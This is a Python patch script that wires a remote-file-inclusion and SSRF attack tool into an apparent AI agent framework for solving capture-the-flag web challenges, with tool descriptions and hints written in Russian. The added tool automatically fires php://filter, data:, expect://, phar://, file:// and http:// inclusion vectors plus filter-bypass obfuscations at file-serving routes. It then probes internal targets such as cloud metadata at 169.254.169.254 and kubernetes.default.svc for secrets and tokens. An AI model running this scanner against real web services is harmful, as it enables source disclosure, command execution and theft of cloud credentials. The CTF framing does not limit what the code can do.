#!/usr/bin/env python3
"""v7 part 2: tool_http_include + remote_inclusion profile + registry."""

from __future__ import annotations

from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
P = ROOT / "app" / "agent" / "ctf" / "profiles.py"


def patch(old: str, new: str) -> None:
    s = P.read_text(encoding="utf-8")
    assert old in s, f"anchor not found: {old[:70]!r}"
    s = s.replace(old, new, 1)
    P.write_text(s, encoding="utf-8")


# ---------------------------------------------------------- tool_http_include
# Insert right before the SQLi domain section marker.
patch(
    """# --------------------------------------------------------------------------
# SQLi domain: form discovery + login-bypass matrices (login-bypass family)
# --------------------------------------------------------------------------""",
    '''def tool_http_include(session: Session, action):
    """RFI matrix runner: scheme x bypass x param x route.

    Fires URI-scheme inclusion vectors (stream wrappers, data:, expect://,
    phar://, file://, http(s)://) through the file-serving routes found by
    http_discover. ``res`` placeholders are filled from the seed names;
    ``{abs}`` from FIXED_ABS_READS; ``{host}`` from the target host. When a
    remote scheme answers, the SSRF target list follows automatically.
    """
    names = action.get("names") or []
    if isinstance(names, str):
        names = [names]
    names = [str(n).strip().lstrip("/") for n in names if str(n).strip()][:4]
    if not names:
        return "names must be a non-empty list"
    routes = [r for r in ([str(action.get("route") or "")] + session.routes) if r]
    if not (routes or session.route):
        return {
            "error": "no route: call http_discover first or pass route:'/download?file='",
            "hint": "the include may also live in a POST form — use http_post",
        }
    if not routes:
        routes = [session.route]
    routes = list(dict.fromkeys(routes))[:3]

    # placeholder context
    seed = [n for n in session.public_names()[:3]] or ["notes.txt"]
    res_choices = list(dict.fromkeys(names + seed))[:6]
    host = urllib.parse.urlsplit(session.target).hostname or "localhost"
    abs_reads = [a.lstrip("/") for a in FIXED_ABS_READS[:8]]

    def render(v: str) -> str:
        v = v.replace("{host}", host)
        out = []
        # {res} may appear inside longer wrappers — expand every name
        if "{res}" in v:
            for r in res_choices:
                out.append(v.replace("{res}", urllib.parse.quote(r)))
        else:
            out.append(v)
        # {abs} expands to the fixed high-value absolute targets
        expanded = []
        for item in out:
            if "{abs}" in item:
                for a in abs_reads:
                    expanded.append(item.replace("{abs}", urllib.parse.quote(a)))
            else:
                expanded.append(item)
        return expanded

    hp_sha = session.http_get("/").get("sha1")

    # Phase A: raw scheme vectors per route (param value form)
    jobs = []
    for route in routes:
        for scheme in INCLUDE_SCHEMES:
            for payload in render(scheme):
                if "?" in route:
                    key = route.split("?", 1)[1].split("=", 1)[0]
                    if key and key.replace("_", "").isalnum():
                        jobs.append(
                            "%s&%s=%s"
                            % (route, key, urllib.parse.quote(payload, safe=""))
                        )
                        continue
                jobs.append(route + urllib.parse.quote(payload, safe=""))
    jobs = list(dict.fromkeys(jobs))[:300]
    hits = []
    for i in range(0, len(jobs), 110):
        chunk = session.http_batch({"paths": jobs[i : i + 110]})
        hits.extend(session.distinct(chunk, hp_sha))
        if any(h.get("flag_shaped_values") for h in hits):
            break
    hits = _uniq_by_sha(hits) if hits else []
    definite = [h for h in hits if h.get("flag_shaped_values")]
    if definite:
        return {
            "FLAG_SHAPED": definite[:10],
            "scheme_hits": definite[:10],
            "hint": (
                "SCHEME INCLUSION CONFIRMED: a URI wrapper reached the "
                "include/open. Call finish with the exact decoded body."
            ),
        }

    # Phase B: filter-bypass obfuscations over the same scheme vectors
    bjobs = []
    for route in routes:
        for tmpl, fn in SCHEME_FILTER_BYPASSES:
            try:
                obf = fn(tmpl)
            except Exception:
                continue
            for payload in render(obf):
                if "?" in route:
                    key = route.split("?", 1)[1].split("=", 1)[0]
                    if key and key.replace("_", "").isalnum():
                        bjobs.append(
                            "%s&%s=%s"
                            % (route, key, urllib.parse.quote(payload, safe=""))
                        )
                        continue
                bjobs.append(route + urllib.parse.quote(payload, safe=""))
    bjobs = list(dict.fromkeys(bjobs))[:240]
    bhits = []
    for i in range(0, len(bjobs), 110):
        chunk = session.http_batch({"paths": bjobs[i : i + 110]})
        bhits.extend(session.distinct(chunk, hp_sha))
        if any(h.get("flag_shaped_values") for h in bhits):
            break
    bhits = _uniq_by_sha(bhits) if bhits else []
    bdefinite = [h for h in bhits if h.get("flag_shaped_values")]
    if bdefinite:
        return {
            "FLAG_SHAPED": bdefinite[:10],
            "scheme_bypass_hits": bdefinite[:10],
            "hint": (
                "SCHEME-FILTER BYPASS CONFIRMED: the obfuscated wrapper got "
                "through. Call finish with the exact decoded body."
            ),
        }

    # Phase C: SSRF sweep — only if a remote scheme produced ANY hit
    out = {
        "routes_tried": routes,
        "scheme_hits": hits[:20],
        "scheme_bypass_hits": bhits[:20],
        "ssrf": "not probed: no remote-scheme response yet",
    }
    remote_evidence = [
        h
        for h in hits + bhits
        if any(
            marker in str(h.get("preview", ""))[:200].lower()
            for marker in ("rfi_probe", "server:", "metadata", "<", "{")
        )
    ]
    if remote_evidence:
        sjobs = []
        for route in routes[:1]:
            key = ""
            if "?" in route:
                key = route.split("?", 1)[1].split("=", 1)[0]
            for target in SSRF_TARGETS:
                payload = urllib.parse.quote(target, safe="")
                if key and key.replace("_", "").isalnum():
                    sjobs.append("%s&%s=%s" % (route, key, payload))
                else:
                    sjobs.append(route + payload)
        sjobs = list(dict.fromkeys(sjobs))[:60]
        shits = []
        for i in range(0, len(sjobs), 60):
            chunk = session.http_batch({"paths": sjobs[i : i + 60]})
            shits.extend(session.distinct(chunk, hp_sha))
        shits = _uniq_by_sha(shits) if shits else []
        out["ssrf"] = {
            "probed": len(sjobs),
            "hits": shits[:15],
            "hint": (
                "remote inclusion works — internal endpoints answered; "
                "inspect bodies for secrets/tokens"
            )
            if shits
            else "internal targets returned nothing distinct",
        }
    out["hint"] = (
        "No wrapper answered. Check: (1) is the param actually reaching "
        "include()? try http_post with a form field; (2) try the LFI "
        "http_traverse matrix — the vuln may be pure path traversal."
    )
    return out


# --------------------------------------------------------------------------
# SQLi domain: form discovery + login-bypass matrices (login-bypass family)
# --------------------------------------------------------------------------''',
)

# ------------------------------------------------------- tool descriptions
patch(
    '''{"tool":"unpack_url","path":"/backup.zip","filter":"flag|secret"} — скачать архив и перечислить члены с совпадениями.
{"tool":"decode","value":"...","encoding":"base64|hex|url"} — декодировать значение.
{"tool":"finish","flag":"<точное значение>"} — записать флаг (принимается ТОЛЬКО если он есть в сохранённых ответах).
"""''',
    '''{"tool":"unpack_url","path":"/backup.zip","filter":"flag|secret"} — скачать архив и перечислить члены с совпадениями.
{"tool":"decode","value":"...","encoding":"base64|hex|url"} — декодировать значение.
{"tool":"finish","flag":"<точное значение>"} — записать флаг (принимается ТОЛЬКО если он есть в сохранённых ответах).
"""

TOOL_DESCRIPTIONS_INCLUDE = """
Доступные инструменты (отвечай ТОЛЬКО одним JSON-объектом за шаг):
{"tool":"inventory"} — список файлов materials с размерами.
{"tool":"read_file","path":"notes.txt","start_line":1,"max_lines":80} — прочитать файл (только внутри materials).
{"tool":"grep_files","pattern":"secret|flag","max_hits":50} — поиск по файлам.
{"tool":"http","path":"/","method":"GET"} — один HTTP-запрос к службе (GET/HEAD).
{"tool":"http_batch","paths":["/a","/b"]} — до 120 параллельных GET с дедупом и сводкой.
{"tool":"http_discover"} — найти маршрут отдачи файлов и имя параметра (two-pass, href, plain-пути).
{"tool":"http_include","names":["flag.txt","app.py"]} — ГЛАВНЫЙ ИНСТРУМЕНТ RFI: матрица URI-схем (php://filter, data:, expect://, phar://, zip://, file://, http(s)://, ssh2, SMB UNC) x обходы схемных фильтров (регистр, пробелы в схеме, \\\\, двойное кодирование, php-цепочки) x маршруты; при ответе удалённой схемы — автоматический SSRF-обход внутренних целей (метаданные облака, loopback, оркестраторы).
{"tool":"http_traverse","names":["secret.txt","app.py","/proc/self/environ"],"max_depth":6} — LFI-матрица обходов (канарейка /etc/passwd, обход×глубина×имя, /proc/self/...).
{"tool":"unpack_url","path":"/backup.zip","filter":"flag|secret"} — скачать архив и перечислить члены с совпадениями.
{"tool":"decode","value":"...","encoding":"base64|hex|url"} — декодировать значение.
{"tool":"finish","flag":"<точное значение>"} — записать флаг (принимается ТОЛЬКО если он есть в сохранённых ответах).
"""''',
)

# ------------------------------------------------------------- hint constant
patch(
    """HINT_PATH_ASSEMBLY_BYPASS = (""",
    """HINT_REMOTE_INCLUSION = (
    "RFI/ВКЛЮЧЕНИЕ ПО URI-СХЕМЕ: служба на http://target:8000 принимает имя "
    "файла в параметре и передаёт его в include/open БЕЗ проверки схемы. "
    "Вектор: php://filter/convert.base64-encode/resource=<файл> читает ИСХОДНИК "
    "любого файла (в т.ч. .php), data:// подставляет payload без egress, "
    "expect:// исполняет команду, file:// — абсолютный путь, http(s):// — "
    "удалённое включение; если фильтр требует http:// — SSRF по внутренним "
    "целям (метаданные 169.254.169.254, kubernetes.default.svc, loopback). "
    "Начни с http_discover, затем http_include."
)

HINT_PATH_ASSEMBLY_BYPASS = (""",
)

# -------------------------------------------------------- profile + registry
patch(
    """PATH_ASSEMBLY_BYPASS = Profile(""",
    """REMOTE_INCLUSION = Profile(
    name="remote_inclusion",
    summary="RFI: включение по URI-схеме (php://, data:, expect://, http:// + SSRF)",
    hint=HINT_REMOTE_INCLUSION,
    tool_descriptions=TOOL_DESCRIPTIONS_INCLUDE,
    call_tool=_include_call_tool(),
    validate_finish=_http_verified_finish,
    fallback=_http_fallback,
    crash_fallback=_http_crash_fallback,
    deadline_seconds=560,
)

PATH_ASSEMBLY_BYPASS = Profile(""",
)

patch(
    """    "path_assembly_bypass": PATH_ASSEMBLY_BYPASS,""",
    """    "path_assembly_bypass": PATH_ASSEMBLY_BYPASS,
    "remote_inclusion": REMOTE_INCLUSION,""",
)

# ------------------------------------------------------------ call_tool wiring
patch(
    """def _git_call_tool(session: Session, action):""",
    """def _include_call_tool():
    def call_tool(session: Session, action):
        name = str(action.get("tool", ""))
        if name == "inventory":
            return tool_inventory(session)
        if name == "read_file":
            return tool_read_file(session, action)
        if name == "grep_files":
            return tool_grep_files(session, action)
        if name == "http":
            return session.http_get(
                action.get("path", "/"), action.get("method", "GET")
            )
        if name == "http_batch":
            return session.http_batch(action)
        if name == "http_discover":
            return tool_http_discover(session)
        if name == "http_include":
            return tool_http_include(session, action)
        if name == "http_traverse":
            return tool_http_traverse(
                session, action, assembly_vectors=False
            )
        if name == "unpack_url":
            return tool_unpack_url(session, action)
        if name == "decode":
            return tool_decode(session, action)
        return (
            "Invalid tool. Use inventory, read_file, grep_files, http, "
            "http_batch, http_discover, http_include, http_traverse, "
            "unpack_url, decode, or finish."
        )

    return call_tool


def _git_call_tool(session: Session, action):""",
)

print("tool_http_include + remote_inclusion profile wired")
